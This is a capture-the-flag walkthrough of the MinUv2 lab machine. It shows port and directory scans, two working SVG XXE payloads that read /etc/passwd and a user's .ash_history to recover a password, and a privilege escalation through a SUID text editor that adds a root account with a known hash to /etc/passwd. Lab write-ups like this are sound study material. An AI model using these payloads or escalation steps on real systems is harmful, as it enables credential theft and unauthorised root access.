MinUv2

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[+] Contente Discovery - searching for a specific file .html
[+] SVG exploitation with XXE
[+] Getting credentials from ash_history
[+] Privilege Escalation with micro editor -> adding user to /etc/passwd

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Scan Results

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Nmap scan report for 192.168.56.110
Host is up (0.00037s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 82:33:25:61:27:97:ea:4a:49:f5:76:a3:33:1c:ae:2b (RSA)
|   256 ed:ca:f6:b9:b5:39:32:89:d0:a3:36:94:82:04:4a:e8 (ECDSA)
|_  256 26:79:15:2e:be:93:02:41:04:c9:ea:e8:05:16:d1:83 (ED25519)
3306/tcp open  mysql?
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain
|     Transfer-Encoding: chunked
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 404 Not Found
|     X-Powered-By: Kemal
|     Content-Type: text/html
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <style type="text/css">
|     body { text-align:center;font-family:helvetica,arial;font-size:22px;
|     color:#888;margin:20px}
|     max-width: 579px; width: 100%; }
|     {margin:0 auto;width:500px;text-align:left}
|     </style>
|     </head>
|     <body>
|     <h2>Kemal doesn't know this way.</h2>
|_    <svg id="svg" version="1.1" width="400" height="400" viewBox="0 0 400 400" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" ><g id="svgg"><path id="path0" d="M262.800 99.200 L 262.800 150.400 265.461 150.400 L 268.121 150.400 267.864 144.300 C 267.722 140.945,267.510 120.110,267.391 98.000 C 267.273 75.890,267.074 55.595,266.948 52.900 L 266.719 48.000 264.760 48.000 L 262.800 48.000 262.800 99.200 M160.800 290.800 C 160.800 291.301,161.224 291.301,162.000
|_mysql-info: ERROR: Script execution failed (use -d to debug)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Dirb http://192.68.56.110:3306

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# dirb http://192.168.56.110:3306 -X .html


-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Nov  5 09:22:57 2019
URL_BASE: http://192.168.56.110:3306/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
EXTENSIONS_LIST: (.html) | (.html) [NUM = 1]

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.56.110:3306/ ----
+ http://192.168.56.110:3306/upload.html (CODE:200|SIZE:908)                   
                                                                               
-
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


We can upload a SVG file
![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/MinU/min1.png)

SVG XXE AttacK
https://insinuator.net/2015/03/xxe-injection-in-apache-batik-library-cve-2015-0250/


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# cat file.svg 
<?xml version="1.0" standalone="yes"?><!DOCTYPE ernw [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]><svg width="500px" height="40px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">&xxe;</svg>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Uploading the file to the server and we get the content of /etc/passwd

![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/MinU/min2.png)


Retrieving employee .ash_history

Payload:


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# cat getConent.svg 
<?xml version="1.0" standalone="yes"?><!DOCTYPE ernw [ <!ENTITY xxe SYSTEM "file:///home/employee/.ash_history" > ]><svg width="500px" height="40px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">&xxe;</svg>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


After upoading we get the password

![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/MinU/min3.png)

Connecting to the server:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# ssh employee@192.168.56.110
The authenticity of host '192.168.56.110 (192.168.56.110)' can't be established.
ECDSA key fingerprint is SHA256:yDEwMAaye9gQ8q+xTLQxriV2ww9YRUYoGqvsqtXbskI.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.56.110' (ECDSA) to the list of known hosts.
employee@192.168.56.110's password: 
        _                   ____  
  /\/\ (_)_ __  /\ /\__   _|___ \ 
 /    \| | '_ \/ / \ \ \ / / __) |
/ /\/\ \ | | | \ \_/ /\ V / / __/ 
\/    \/_|_| |_|\___/  \_/ |_____|


minuv2:~$ id
uid=1000(employee) gid=1000(employee) groups=1000(employee)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Privilege Escalation

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
minuv2:~$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/micro
/bin/bbsuid
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


We are going to use micro (editor) to get root on the system
This is basic privilege escalation with editor. In ordet to escalate the privileges we edit /etc/passwd by adding a user:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# openssl passwd -1 -salt SALT admin123
$1$SALT$bvxkiSQK0rSue1A6i7lUj0



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Create a record in /etc/passwd and add the following user into it:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
setrus:$1$SALT$bvxkiSQK0rSue1A6i7lUj0:0:0:root:root:/bin/ashh
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Opening /etc/passwd with micro

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
minuv2:~$ cat /etc/passwd | micro

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Adding the user test into /etc/passwd

![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/MinU/min4.png)

Privilege escalation to root

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
minuv2:~$ su setrus
Password: 
minuv2:/home/employee# id
uid=0(root) gid=0(root) groups=0(root)
minuv2:/home/employee# cd /root
minuv2:~# ls
flag.txt
minuv2:~# cat flag.txt
        _                   ____  
  /\/\ (_)_ __  /\ /\__   _|___ \ 
 /    \| | '_ \/ / \ \ \ / / __) |
/ /\/\ \ | | | \ \_/ /\ V / / __/ 
\/    \/_|_| |_|\___/  \_/ |_____|

# You got r00t!

 flag{6d696e75326973617765736f6d65}

# I hope you had fun hacking this box, I tried to design this VM to be (a bit) different
# by having newer or not-so-common technologies and a minumal linux install.
#
# Please don't post the content below on Social Networks to let others do the challenge.
#
# As you know by now, the entry point is an XXE vulnerability that can be exploited by
# modifying an image. After that you can enumerate a user and the linux version to know
# that it uses a different file in its home dir.
# To read this you used a suspicious file permission on certain text editor.
# At least that's how it was planned ;)
# Let me know if you got here using another method!
#
# contact@8bitsec.io
# @_8bitsec

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

